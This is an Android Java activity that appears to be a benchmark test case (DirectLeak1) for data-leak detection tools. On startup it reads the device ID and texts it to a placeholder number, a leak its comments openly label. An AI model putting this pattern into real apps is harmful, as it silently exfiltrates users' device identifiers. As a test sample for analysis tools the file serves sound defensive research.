package xx.xxx;

import xx.xxx.R;
import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
/**
 * @testcase_name DirectLeak1
 * @version 0.1
 * 
 * @description Easy testcase: The value of a source is directly sent to a sink
 * @dataflow source -> sink
 * @number_of_leaks 1
 * @challenges -
 */
public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        TelephonyManager mgr = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
		SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, mgr.getDeviceId(), null, null); //source, sink, leak
    }
}
